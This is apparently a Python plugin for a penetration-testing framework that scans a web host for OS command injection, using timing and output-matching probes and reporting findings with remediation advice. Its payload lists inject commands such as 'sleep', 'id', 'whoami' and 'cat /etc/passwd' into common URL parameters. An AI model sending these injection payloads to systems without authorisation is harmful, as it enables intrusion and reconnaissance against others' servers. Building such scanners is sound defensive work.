"""OS command injection detection via time-based and output-based techniques."""

from __future__ import annotations

import time
from typing import ClassVar
from urllib.parse import quote

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

# Time-based payloads (detect via response time difference)
TIME_PAYLOADS: list[tuple[str, int]] = [
    (";sleep 5", 5),
    ("|sleep 5", 5),
    ("$(sleep 5)", 5),
    ("`sleep 5`", 5),
    ("|| sleep 5", 5),
    ("& timeout 5", 5),
    ("%0asleep 5", 5),
    ("';sleep 5;'", 5),
    ("\";sleep 5;\"", 5),
    ("{sleep,5}", 5),
    ("$((sleep 5))", 5),
]

# Output-based payloads (detect via response content)
# Each tuple: (payload, indicators_in_output, anti_reflect)
# anti_reflect: if this string appears, it's just input reflection, not execution
OUTPUT_PAYLOADS: list[tuple[str, list[str], str]] = [
    (";id", ["uid=", "gid="], ""),
    ("|id", ["uid=", "gid="], ""),
    ("$(id)", ["uid=", "gid="], ""),
    ("`id`", ["uid=", "gid="], ""),
    (";cat /etc/passwd", ["root:x:0"], ""),
    ("|cat /etc/passwd", ["root:x:0"], ""),
    (";echo CMDI_TEST_12345", ["CMDI_TEST_12345"], ";echo"),
    ("|echo CMDI_TEST_12345", ["CMDI_TEST_12345"], "|echo"),
    ("$(echo CMDI_TEST_12345)", ["CMDI_TEST_12345"], "echo"),
    (";whoami", ["root", "www-data", "apache", "nginx", "nobody"], ""),
    ("|whoami", ["root", "www-data", "apache", "nginx", "nobody"], ""),
    (";uname -a", ["Linux", "Darwin", "GNU"], ""),
    ("|uname -a", ["Linux", "Darwin", "GNU"], ""),
    (";hostname", [], ""),
    ("|pwd", ["/var/www", "/home", "/srv"], ""),
]

INJECTABLE_PARAMS = [
    "cmd", "exec", "command", "ping", "query", "jump", "code",
    "reg", "do", "func", "arg", "option", "load", "process",
    "step", "read", "feature", "val", "run", "print", "execute",
    "search", "ip", "host", "domain", "url",
]

SCAN_PATHS = [
    "/", "/ping", "/admin", "/debug",
    "/api/exec", "/tools", "/diagnostic", "/system",
]

# Threshold in seconds above baseline to consider time-based detection
TIME_THRESHOLD = 4.0


class CommandInjectionPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="command_injection",
        display_name="Command Injection Check",
        category=PluginCategory.PENTESTING,
        description="Detects OS command injection vulnerabilities",
        produces=["cmdi_findings"],
        timeout=25.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host,
                error="HTTP client not available",
            )

        findings: list[Finding] = []
        tested: list[dict] = []
        base_url = ""

        for scheme in ("https", "http"):
            try:
                async with ctx.rate:
                    await ctx.http.head(
                        f"{scheme}://{target.host}/", timeout=5.0,
                    )
                    base_url = f"{scheme}://{target.host}"
                    break
            except Exception:
                continue

        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"cmdi_tests": []},
            )

        for path in SCAN_PATHS:
            for param in INJECTABLE_PARAMS:
                # Establish baseline response time
                baseline_url = f"{base_url}{path}?{param}=test"
                baseline_time = await self._measure_time(
                    ctx, baseline_url,
                )
                if baseline_time is None:
                    continue

                # Try output-based payloads first (confirmed injection)
                found_output = await self._check_output(
                    ctx, base_url, path, param,
                    findings, tested,
                )
                if found_output:
                    break

                # Try time-based payloads (potential injection)
                found_time = await self._check_timing(
                    ctx, base_url, path, param,
                    baseline_time, findings, tested,
                )
                if found_time:
                    break

            if findings:
                break

        if not findings:
            findings.append(Finding.info(
                "No command injection detected",
                tags=["pentesting", "cmdi"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"cmdi_tests": tested},
        )

    async def _measure_time(self, ctx, url: str) -> float | None:
        """Send a request and return the elapsed time in seconds."""
        try:
            async with ctx.rate:
                start = time.monotonic()
                await ctx.http.get(url, timeout=8.0)
                return time.monotonic() - start
        except Exception:
            return None

    async def _check_output(
        self,
        ctx,
        base_url: str,
        path: str,
        param: str,
        findings: list[Finding],
        tested: list[dict],
    ) -> bool:
        """Test output-based payloads. Return True if injection found."""
        # Get baseline body to detect SPA reflection
        baseline_body = ""
        try:
            async with ctx.rate:
                br = await ctx.http.get(
                    f"{base_url}{path}?{param}=harmless",
                    timeout=8.0,
                )
                baseline_body = await br.text(
                    encoding="utf-8", errors="replace",
                )
        except Exception:
            pass

        for payload, indicators, anti_reflect in OUTPUT_PAYLOADS:
            url = (
                f"{base_url}{path}"
                f"?{param}={quote(payload)}"
            )
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(url, timeout=8.0)
                    body = await resp.text(
                        encoding="utf-8", errors="replace",
                    )

                    # Skip if response is HTML (not command output)
                    if body.strip().startswith(("<!DOCTYPE", "<html")):
                        continue

                    # Skip if indicator is in baseline (SPA reflection)
                    matched = [i for i in indicators if i in body]
                    if not matched:
                        continue

                    # Skip if anti-reflect pattern in body (input echoed)
                    if anti_reflect and anti_reflect in body:
                        continue

                    # Skip if body looks same as baseline (SPA catch-all)
                    if (
                        baseline_body
                        and abs(len(body) - len(baseline_body)) < 50
                    ):
                        continue

                    if matched:
                        tested.append({
                            "path": path,
                            "param": param,
                            "payload": payload,
                            "type": "output",
                            "indicators": matched,
                        })
                        findings.append(Finding.critical(
                            f"Command injection via "
                            f"{path}?{param}=",
                            description=(
                                "OS command output detected in "
                                f"response with payload: {payload}"
                            ),
                            evidence=(
                                f"Response contains: "
                                f"{', '.join(matched)}"
                            ),
                            remediation=(
                                "Never pass user input to OS "
                                "commands. Use safe APIs and "
                                "input validation."
                            ),
                            tags=["pentesting", "cmdi"],
                        ))
                        return True
            except Exception:
                continue
        return False

    async def _check_timing(
        self,
        ctx,
        base_url: str,
        path: str,
        param: str,
        baseline_time: float,
        findings: list[Finding],
        tested: list[dict],
    ) -> bool:
        """Test time-based payloads. Return True if injection found."""
        for payload, _delay in TIME_PAYLOADS:
            url = (
                f"{base_url}{path}"
                f"?{param}={quote(payload)}"
            )
            try:
                async with ctx.rate:
                    start = time.monotonic()
                    await ctx.http.get(url, timeout=15.0)
                    elapsed = time.monotonic() - start

                    delta = elapsed - baseline_time
                    if delta >= TIME_THRESHOLD:
                        tested.append({
                            "path": path,
                            "param": param,
                            "payload": payload,
                            "type": "time",
                            "baseline": round(baseline_time, 2),
                            "elapsed": round(elapsed, 2),
                        })
                        findings.append(Finding.high(
                            f"Potential command injection "
                            f"(time-based) via "
                            f"{path}?{param}=",
                            description=(
                                "Response delayed by "
                                f"{delta:.1f}s with payload: "
                                f"{payload}"
                            ),
                            evidence=(
                                f"Baseline: {baseline_time:.2f}s, "
                                f"Payload: {elapsed:.2f}s"
                            ),
                            remediation=(
                                "Never pass user input to OS "
                                "commands. Use safe APIs and "
                                "input validation."
                            ),
                            tags=["pentesting", "cmdi"],
                        ))
                        return True
            except Exception:
                continue
        return False
